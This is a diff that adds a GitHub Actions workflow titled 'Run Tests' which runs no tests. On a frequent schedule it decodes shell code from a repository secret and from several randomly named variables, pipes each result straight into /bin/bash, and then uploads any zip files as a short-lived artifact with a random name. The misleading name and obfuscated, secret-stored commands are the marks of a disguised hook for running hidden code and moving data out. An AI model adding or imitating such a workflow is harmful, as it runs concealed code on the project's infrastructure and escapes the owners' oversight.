@@ -1,0 +1,33 @@
+name: Run Tests
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '48 3,9,15,21 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  task:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Execute
+        env:
+          kw29: ${{ secrets.kw29 }}
+        run: |
+          printf '%s' "$kw29" | jq -r .cvzbd74653 | /bin/bash
+          printf '%s' "$baf1678" | jq -r .mkba097 | /bin/bash
+          printf '%s' "$oy6" | jq -r .t04106 | /bin/bash
+          echo $gejp1829 | jq -r .ffkh95060 | /bin/bash
+          printf '%s' "$ww07539" | jq -r .tmsti836 | /bin/bash
+          echo $lf72 | jq -r .tryo8 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: l39iNuIC
+          path: "*.zip"
+          retention-days: 1
